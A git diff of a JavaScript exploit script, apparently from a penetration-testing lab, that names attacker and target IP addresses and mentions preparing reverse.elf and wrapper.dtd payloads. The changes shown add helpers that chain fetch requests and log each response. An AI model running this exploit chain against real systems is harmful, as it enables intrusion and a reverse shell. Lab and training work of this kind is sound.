@@ -1,4 +1,5 @@
-// ensure and create before running this script reverse.elf
+// create before running this script wrapper.dtd, csharp.txt, and reverse.elf
+// also the simlutator closes too fast
 async function exploit() {
   const attacker_ip = '192.168.119.123';
   const host_ip = '192.168.123.251';
@@ -166,29 +167,20 @@ async function exploit() {
     }
   );
   
+  
+  // See for scaling fetch with: https://stackoverflow.com/questions/40981040/using-a-fetch-inside-another-fetch-in-javascript
+
   // and handle errors
   const handleFetch = async (url,config) => {
     const res = await fetch(url,config).catch(console.error);
-    const regex_success = new RegExp('.*<p>An error occurred:.*<\/p></p>');
-    const regex_statement_result = new RegExp('.*<pre>.*\s\S.*\s\S\/pre>');
-    /*text =  await res.text();
-    if(text.match(regex_success)) {
-      return text.match(regex)[0]; 
-    }
-    else if (text.match(regex_statement_result)) {
-      return text.match(regex)[0]; 
-    }
-    return '';
-    */
     return res.text();
-
   }
 
   // reduce fetches, receives the response
   // of the previous, log it (and maybe use it as input)
   const reduceFetch = async (acc, curr) => {
     const prev = await acc;
-    //console.log('previous call:', prev);
+    console.log('previous call:', prev);
 
     return handleFetch(curr.url, curr.config);
   }
